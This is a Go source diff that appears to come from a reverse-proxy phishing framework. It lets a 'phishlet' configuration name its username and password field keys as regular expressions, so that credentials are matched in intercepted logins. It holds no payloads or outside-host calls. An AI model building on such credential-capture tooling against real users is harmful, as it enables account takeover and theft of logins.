@@ -2,6 +2,7 @@ package core
 
 import (
 	"encoding/base64"
+	"fmt"
 	"net/url"
 	"regexp"
 	"strings"
@@ -34,21 +35,23 @@ type AuthToken struct {
 }
 
 type Phishlet struct {
-	Site         string
-	Name         string
-	Author       string
-	minVersion   string
-	proxyHosts   []ProxyHost
-	domains      []string
-	subfilters   map[string][]SubFilter
-	authTokens   map[string][]*AuthToken
-	authUrls     []*regexp.Regexp
-	k_username   string
-	re_username  string
-	k_password   string
-	re_password  string
-	landing_path []string
-	cfg          *Config
+	Site          string
+	Name          string
+	Author        string
+	minVersion    string
+	proxyHosts    []ProxyHost
+	domains       []string
+	subfilters    map[string][]SubFilter
+	authTokens    map[string][]*AuthToken
+	authUrls      []*regexp.Regexp
+	k_username    string
+	k_re_username *regexp.Regexp
+	re_username   string
+	k_password    string
+	k_re_password *regexp.Regexp
+	re_password   string
+	landing_path  []string
+	cfg           *Config
 }
 
 type ConfigProxyHost struct {
@@ -118,8 +121,10 @@ func (p *Phishlet) Clear() {
 	p.authTokens = make(map[string][]*AuthToken)
 	p.authUrls = []*regexp.Regexp{}
 	p.k_username = ""
+	p.k_re_username = nil
 	p.re_username = ""
 	p.k_password = ""
+	p.k_re_password = nil
 	p.re_password = ""
 }
 
@@ -166,10 +171,47 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		}
 		p.authUrls = append(p.authUrls, re)
 	}
+
+	st := strings.Split(fp.UserRegex.Key, ",")
+	if len(st) > 0 {
+		key := st[0]
+		p.k_username = key
+
+		for i := 1; i < len(st); i++ {
+			switch st[i] {
+			case "regexp":
+				var err error
+				p.k_re_username, err = regexp.Compile(key)
+				if err != nil {
+					return err
+				}
+			}
+		}
+	} else {
+		return fmt.Errorf("user_regex key name can't be empty")
+	}
 	p.re_username = fp.UserRegex.Re
-	p.k_username = fp.UserRegex.Key
+
+	st = strings.Split(fp.PassRegex.Key, ",")
+	if len(st) > 0 {
+		key := st[0]
+		p.k_password = key
+
+		for i := 1; i < len(st); i++ {
+			switch st[i] {
+			case "regexp":
+				var err error
+				p.k_re_password, err = regexp.Compile(key)
+				if err != nil {
+					return err
+				}
+			}
+		}
+	} else {
+		return fmt.Errorf("pass_regex key name can't be empty")
+	}
 	p.re_password = fp.PassRegex.Re
-	p.k_password = fp.PassRegex.Key
+
 	p.landing_path = fp.LandingPath
 
 	return nil
